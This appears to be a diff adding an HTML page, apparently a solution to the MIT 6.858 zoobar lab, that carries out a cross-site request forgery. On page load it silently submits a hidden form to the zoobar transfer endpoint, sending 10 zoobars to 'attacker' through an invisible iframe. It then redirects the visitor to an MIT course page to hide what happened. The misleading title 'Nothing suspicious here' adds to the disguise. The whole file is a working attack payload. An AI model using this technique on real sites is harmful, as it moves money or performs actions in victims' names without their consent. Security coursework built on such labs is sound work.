@@ -1,0 +1,24 @@
+<html>
+  <head>
+    <title>Nothing suspicious here</title>
+    <script>
+      document.addEventListener("DOMContentLoaded", function() {
+              document.querySelector("form").addEventListener("submit", function() {
+                      window.location.replace("https://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014");
+                    });
+
+              document.querySelector("#submit").click();
+            });
+
+
+    </script>
+  </head>
+  <body>
+    <iframe name="dummyframe" style="display:none"></iframe>
+    <form method="post" action="http://localhost:8080/zoobar/index.cgi/transfer" target="dummyframe">
+      <input name="zoobars" value="10">
+      <input name="recipient" value="attacker">
+      <input type="submit" id="submit">
+    </form>
+  </body>
+</html>
